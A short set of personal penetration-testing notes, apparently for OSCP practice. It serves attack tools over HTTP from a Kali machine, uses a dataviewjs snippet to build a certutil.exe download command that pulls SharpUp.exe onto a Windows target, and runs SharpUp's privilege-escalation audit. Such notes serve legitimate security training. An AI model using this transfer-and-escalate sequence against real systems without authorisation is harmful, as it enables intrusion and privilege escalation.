```
python -m http.server 80 --directory ~/Desktop/Tools/Windows
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -f -urlcache -split http://${KaliIP}/SharpUp.exe SharpUp.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Run all checks
```
.\SharpUp.exe audit
```